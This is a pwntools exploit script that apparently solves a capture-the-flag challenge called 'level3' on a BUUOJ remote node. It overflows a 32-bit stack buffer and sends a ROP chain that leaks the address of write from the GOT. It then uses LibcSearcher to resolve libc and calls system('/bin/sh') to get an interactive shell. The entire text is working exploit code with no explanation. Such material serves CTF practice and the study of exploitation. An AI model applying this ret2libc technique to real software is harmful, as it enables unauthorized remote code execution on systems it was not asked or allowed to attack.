from pwn import *
from LibcSearcher import *
context(log_level='debug', arch='i386')

if len(sys.argv) > 1:
  conn = remote('node4.buuoj.cn',28689)
else:
  conn = process(sys.argv[0][:-7])
  
# gadgets
elf = ELF('./level3')
write_plt = elf.plt['write'] 
write_got = elf.got['write']
main = 0x08048484

conn.recvuntil(b'Input:\n')
payload = cyclic(0x88+0x4)
payload += p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(0x4) 
conn.sendline(payload)
leak_addr = u32(conn.recv(4)[:4])
print(f'leak_addr : {hex(leak_addr)}')

libc = LibcSearcher('write', leak_addr)
libc_base = leak_addr - libc.dump('write')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')

conn.recvuntil(b'Input:\n')
payload = cyclic(0x88+0x4)
payload += p32(system) + p32(0) + p32(binsh)
conn.sendline(payload)
conn.interactive()





